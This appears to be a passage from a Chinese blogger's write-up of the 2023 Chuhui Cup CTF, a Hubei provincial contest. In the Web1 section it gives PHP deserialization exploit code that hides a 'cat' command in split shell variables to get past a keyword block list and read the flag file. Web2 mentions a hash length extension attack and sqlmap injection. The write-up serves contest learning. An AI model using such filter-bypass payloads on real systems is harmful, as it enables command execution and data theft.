<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='武汉往事'>
<title>除晦杯2023游寄</title>

<link rel='canonical' href='https://lonelyuan.github.io/p/chb2023/'>

<link rel="stylesheet" href="/scss/style.min.24ef1cc321916467896e8c70c10c0ad7b98c2a8df14298032fb637216e397f50.css"><meta property='og:title' content='除晦杯2023游寄'>
<meta property='og:description' content='武汉往事'>
<meta property='og:url' content='https://lonelyuan.github.io/p/chb2023/'>
<meta property='og:site_name' content='lonelyuan&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='AWDp' /><meta property='article:tag' content='Life' /><meta property='article:published_time' content='2023-12-23T20:29:12&#43;08:00'/><meta property='article:modified_time' content='2023-12-24T00:00:00&#43;00:00'/><meta property='og:image' content='https://lonelyuan.github.io/p/chb2023/chuhui.png' />
<meta name="twitter:title" content="除晦杯2023游寄">
<meta name="twitter:description" content="武汉往事"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://lonelyuan.github.io/p/chb2023/chuhui.png' />
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BLVC1PKZKD"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-BLVC1PKZKD', { 'anonymize_ip': false });
}
</script>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-BLVC1PKZKD', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/rick_hubede16acaa63e012983e5eadbe210d5c_33168_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">👴</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">lonelyuan&#39;s Blog</a></h1>
            <h2 class="site-description"> &gt;&gt; 不要恐慌 | Don&#39;t Panic </h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/lonelyuan'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/FTrumpyeah'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about-me/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About Me</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/categories/cs/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                
                <span>CS</span>
            </a>
        </li>
        
        
        <li >
            <a href='/categories/ctf/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
</svg>



                
                <span>CTF</span>
            </a>
        </li>
        
        
        <li >
            <a href='/categories/life/' >
                
                
                
                    <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1703353990126" class="icon" viewBox="0 0 1026 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1579" xmlns:xlink="http://www.w3.org/1999/xlink" width="200.390625" height="200"><path d="M408.039162 990.5c-127.55 0-228.399-37.292-299.745-110.839C-1.607838 766.368-0.248838 608.506 0.039162 596.086L0.039162 360.5l816 0 0 241.584c0.287 12.32 1.568 166-106.443 277.4C638.173162 953.149 536.714162 990.5 408.039162 990.5zM64.039162 424.5l0 172.486-0.015 0.485c-0.007 0.292-0.807 36.484 10.326 84.192 10.002 42.859 32.05 104.344 80.29 153.855 58.818 60.37 144.074 90.98 253.399 90.98 110.43 0 196.285-30.659 255.182-91.127 47.297-48.558 68.91-108.434 78.713-150.113 10.912-46.394 10.128-81.494 10.118-81.844l-0.015-0.494 0.002-0.422 0-178L64.039162 424.498z" p-id="1580" fill="#c1c1c1"></path><path d="M164.689162 305.692c-21.38 0-52.861-2.453-75.588-24.338-10.228-9.85-22.531-27.783-23.058-57.282-0.371-20.785 6.371-38.588 20.038-52.917 10.327-10.826 22.761-17.728 33.731-23.817 21.512-11.94 26.607-16.168 27.26-30.313 0.368-7.966-1.971-11.408-4.306-13.725-10.549-10.464-38.413-13.537-50.992-12.847l-3.473-63.906c6.593-0.357 65.418-2.524 99.534 31.314 16.287 16.154 24.298 37.633 23.168 62.114-1.045 22.654-8.948 41.907-23.488 57.225-11.549 12.167-24.881 19.567-36.645 26.096-20.981 11.646-20.948 13.497-20.838 19.632 0.108 6.071 1.273 10.217 3.461 12.325 7.238 6.969 29.729 6.522 39.328 6.332 2.328-0.046 4.441-0.085 6.288-0.085l0 64c-1.473 0-3.16 0.036-5.017 0.073C171.270162 305.629 168.107162 305.692 164.689162 305.692z" p-id="1581" fill="#c1c1c1"></path><path d="M412.396162 305.692c-21.38 0-52.861-2.453-75.588-24.338-10.228-9.85-22.531-27.783-23.058-57.282-0.371-20.785 6.371-38.588 20.038-52.917 10.327-10.826 22.761-17.728 33.731-23.817 21.512-11.94 26.607-16.168 27.26-30.313 0.368-7.966-1.971-11.408-4.306-13.725-10.55-10.464-38.411-13.537-50.992-12.847l-3.473-63.906c6.593-0.357 65.418-2.524 99.534 31.314 16.287 16.154 24.298 37.633 23.168 62.114-1.045 22.654-8.948 41.907-23.488 57.225-11.549 12.167-24.881 19.567-36.645 26.096-20.981 11.646-20.948 13.497-20.838 19.632 0.108 6.071 1.273 10.217 3.461 12.325 7.238 6.969 29.727 6.522 39.328 6.332 2.328-0.046 4.441-0.085 6.288-0.085l0 64c-1.473 0-3.16 0.036-5.017 0.073C418.977162 305.629 415.814162 305.692 412.396162 305.692z" p-id="1582" fill="#c1c1c1"></path><path d="M674.674162 305.692c-21.38 0-52.862-2.455-75.588-24.339-10.228-9.849-22.53-27.782-23.058-57.282-0.371-20.785 6.371-38.588 20.038-52.917 10.327-10.826 22.761-17.728 33.731-23.817 21.512-11.94 26.606-16.168 27.26-30.313 0.367-7.966-1.971-11.408-4.306-13.725-10.551-10.464-38.416-13.538-50.992-12.847l-3.473-63.906c6.594-0.356 65.416-2.526 99.534 31.314 16.286 16.154 24.298 37.633 23.168 62.114-1.045 22.654-8.948 41.907-23.488 57.225-11.549 12.167-24.881 19.567-36.644 26.096-20.981 11.646-20.948 13.497-20.839 19.632 0.108 6.07 1.272 10.217 3.461 12.324 7.239 6.97 29.727 6.524 39.329 6.333 2.327-0.046 4.44-0.085 6.287-0.085l0 64c-1.474 0-3.159 0.036-5.017 0.073C681.254162 305.629 678.093162 305.692 674.674162 305.692z" p-id="1583" fill="#c1c1c1"></path><path d="M891.622162 626.189c-73.612 0-133.5-59.888-133.5-133.5 0-73.612 59.888-133.5 133.5-133.5s133.5 59.888 133.5 133.5C1025.122162 566.302 965.234162 626.189 891.622162 626.189zM891.622162 423.189c-38.322 0-69.5 31.178-69.5 69.5 0 38.323 31.178 69.5 69.5 69.5s69.5-31.178 69.5-69.5C961.122162 454.367 929.944162 423.189 891.622162 423.189z" p-id="1584" fill="#c1c1c1"></path></svg>
                
                <span>Life</span>
            </a>
        </li>
        
        
        <li >
            <a href='/categories/sec/' >
                
                
                
                    <svg data-immersive-translate-effect="1" data-immersive_translate_walked="0b66fd33-9d65-4c0d-a958-cdfe41102bc1" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
  <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" data-immersive-translate-effect="1" data-immersive_translate_walked="0b66fd33-9d65-4c0d-a958-cdfe41102bc1"></path>
</svg>
                
                <span>Sec</span>
            </a>
        </li>
        
        
        <li >
            <a href='/todo/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                
                <span>TODO</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                <form action="/search/" class="search-form widget" >
        <p>
            <label>Search</label>
            <input name="keyword" required placeholder="Type something..." />
        
            <button title="Search">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



            </button>
        </p>
    </form>
            
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#楚慧杯除晦杯">楚慧杯？除晦杯！</a></li>
    <li><a href="#冲出西海岸">冲出西海岸</a>
      <ol>
        <li><a href="#初赛wp">初赛WP</a>
          <ol>
            <li><a href="#web1">Web1</a></li>
            <li><a href="#web2">Web2</a></li>
            <li><a href="#知识点总结-phpmd5">知识点总结： PHP:md5()</a></li>
            <li><a href="#misc1">Misc1</a></li>
            <li><a href="#misc2">Misc2</a></li>
            <li><a href="#misc3">Misc3</a></li>
          </ol>
        </li>
        <li><a href="#初赛战报">初赛战报</a></li>
      </ol>
    </li>
    <li><a href="#武汉往事">武汉往事</a>
      <ol>
        <li><a href="#决赛wp">决赛WP</a>
          <ol>
            <li><a href="#流量分析">流量分析</a></li>
            <li><a href="#web1-1">Web1</a></li>
            <li><a href="#web2-1">Web2</a></li>
            <li><a href="#知识点总结sqlmap进阶">知识点总结：SQLmap进阶</a></li>
            <li><a href="#web3">Web3</a></li>
            <li><a href="#web4">Web4</a></li>
          </ol>
        </li>
        <li><a href="#决赛战报">决赛战报</a></li>
      </ol>
    </li>
    <li><a href="#有捞无堂">有捞无堂</a>
      <ol>
        <li><a href="#除晦未半而中道崩殂">除晦未半而中道崩殂</a></li>
      </ol>
    </li>
    <li><a href="#除晦辩证法">除晦辩证法</a>
      <ol>
        <li><a href="#参考文献">参考文献</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
            
                <section class="widget tagCloud">
    <div class="widget-icon">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



    </div>
    <h2 class="widget-title section-title">Categories</h2>

    <div class="tagCloud-tags">
        
            <a href="/categories/cs/" class="font_size_10">
                CS
            </a>
        
            <a href="/categories/sec/" class="font_size_3">
                Sec
            </a>
        
            <a href="/categories/web/" class="font_size_3">
                Web
            </a>
        
            <a href="/categories/ctf/" class="font_size_2">
                CTF
            </a>
        
            <a href="/categories/life/" class="font_size_1">
                Life
            </a>
        
    </div>
</section>

            
        
            
                <section class="widget tagCloud">
    <div class="widget-icon">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
  <circle cx="9" cy="9" r="2" />
</svg>



    </div>
    <h2 class="widget-title section-title">Tags</h2>

    <div class="tagCloud-tags">
        
            <a href="/tags/life/" class="font_size_4">
                Life
            </a>
        
            <a href="/tags/csapp/" class="font_size_3">
                CSAPP
            </a>
        
            <a href="/tags/fuzz/" class="font_size_3">
                fuzz
            </a>
        
            <a href="/tags/fuzzing101/" class="font_size_3">
                fuzzing101
            </a>
        
            <a href="/tags/libafl/" class="font_size_3">
                Libafl
            </a>
        
    </div>
</section>
            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/chb2023/">
                <img src="/p/chb2023/chuhui_hu16a07914fba082891c6db9355734618b_368581_800x0_resize_box_3.png"
                        srcset="/p/chb2023/chuhui_hu16a07914fba082891c6db9355734618b_368581_800x0_resize_box_3.png 800w, /p/chb2023/chuhui_hu16a07914fba082891c6db9355734618b_368581_1600x0_resize_box_3.png 1600w"
                        width="800" 
                        height="575" 
                        loading="lazy"
                        alt="Featured image of post 除晦杯2023游寄" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
            <a href="/categories/life/" >
                Life
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/chb2023/">除晦杯2023游寄</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            武汉往事
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2023-12-23&nbsp;published
                </time><time class="article-time--published">2023-12-24&nbsp;last modified </time> 
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    11 minute read
                    <span class="post-word-count">, 5426 words</span> 
                </time>
            </div>
            
        

    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="楚慧杯除晦杯">楚慧杯？除晦杯！</h2>
<p>👴大约的确很久没写过CTF相关的博客了。因为打CTF就是为了公费旅游，为了彳亍，为了口乞。当然，也可能是彳亍也没彳亍到，鸡毛没挣着，还还扣钱了。</p>
<p>但当👴看到它的名字的时候，👴就知道这是👴一定要打的比赛。因为快过年了，中国人传统上讲要除一除身上的晦气（每日吉祥话1/1）。所以“楚慧杯”这个名字确实有素质，本意是楚地的智慧，表示湖北省赛；谐音也可以表示除去晦气，迎接新的一年。决赛赛场上，果然有工作人员问我们的牌子是不是印错了，👴就是为了这碟醋才包的这盘饺子。</p>
<h2 id="冲出西海岸">冲出西海岸</h2>
<blockquote>
<ul>
<li>Aidaip: 这比赛没什么人报，一个学校能报两队，你看这比赛分4个组，每个组都是前9有钱拿，这不是去捡钱？</li>
<li>👴们：去去去</li>
</ul>
</blockquote>
<p>于是👴们组织了一队本科生一队研究生报名。当即立下军令状，本科生打不过研究生，让人唠一辈子。</p>
<blockquote>
<ul>
<li>组委会：决赛再加8支队伍，一共9个奖谢谢。另外一个学校只能进一队哦~</li>
<li>Aidaip: 他之前的公告绝对不是这样写的。</li>
</ul>
</blockquote>
<p>这下不得不打内战了。</p>
<hr>
<h3 id="初赛wp">初赛WP</h3>
<p>初赛没啥好说的，传统CTF，都是老黄历了。</p>
<h4 id="web1">Web1</h4>
<p>害搁这前端绕过呢，害搁这考<code>www.zip</code>呢。里面是白给反序列化，白给命令执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Flag</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|tac|shell|sort/i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|tac|shell|sort/i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;again?&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s2">&#34;a=c;b=at;c=/fl;d=ag.txt;</span><span class="se">\$</span><span class="s2">a</span><span class="se">\$</span><span class="s2">b </span><span class="se">\$</span><span class="s2">c</span><span class="se">\$</span><span class="s2">d&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="web2">Web2</h4>
<p>里面是哈希长度拓展攻击，👴上一次遇见这玩意还是在第一次打带比赛的时候。</p>
<p>但是👴下了仨环境才下到好用的工具。然后后面能上传文件，还说文件名已写入数据库。但是题目名叫upload，你总不能考注入吧。然后👴就去看misc了。</p>
<p>然后还真是，sqlmap一把梭。傻逼题，血亏x1。</p>
<h4 id="知识点总结-phpmd5">知识点总结： PHP:md5()</h4>
<p>传统CTF考PHP哈希就这老三样：</p>
<ul>
<li>弱类型0e绕过：<code>md5($a) == md5($b) &amp;&amp; $a != $b</code>
<ul>
<li>经典查表</li>
</ul>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
